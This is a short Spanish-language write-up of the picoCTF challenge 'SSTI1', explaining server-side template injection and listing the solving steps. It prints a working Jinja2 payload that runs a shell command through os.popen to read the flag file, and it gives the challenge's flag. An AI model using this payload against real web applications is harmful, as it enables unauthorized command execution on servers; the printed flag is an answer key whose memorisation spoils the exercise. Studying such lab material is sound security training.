## SSTI1

## Descripcion
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:64093/)!
## Solucion

1. Acceder al sitio del reto.
2. Introducir `{{7*7}}` para probar SSTI.
3. Confirmar que el servidor evalúa expresiones.
4. Usar payloads para acceder al sistema.
5. Ejecutar comandos para leer la flag.

{{cycler.__init__.__globals__.os.popen('cat flag').read()}}

**picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}**
## Notas
#### Server-Side Template Injection

La **Server-Side Template Injection (SSTI)** ocurre cuando una aplicación inserta directamente datos del usuario en una plantilla que luego es interpretada por el servidor.

Esto puede permitir a un atacante:
- ejecutar código
- acceder a archivos del sistema
- ejecutar comandos
- obtener información sensible

Es una vulnerabilidad crítica en aplicaciones web.
## Referencias
- OWASP – documentación sobre vulnerabilidades web.
- PortSwigger – guía sobre Server-Side Template Injection.
- picoCTF – plataforma educativa de retos de ciberseguridad.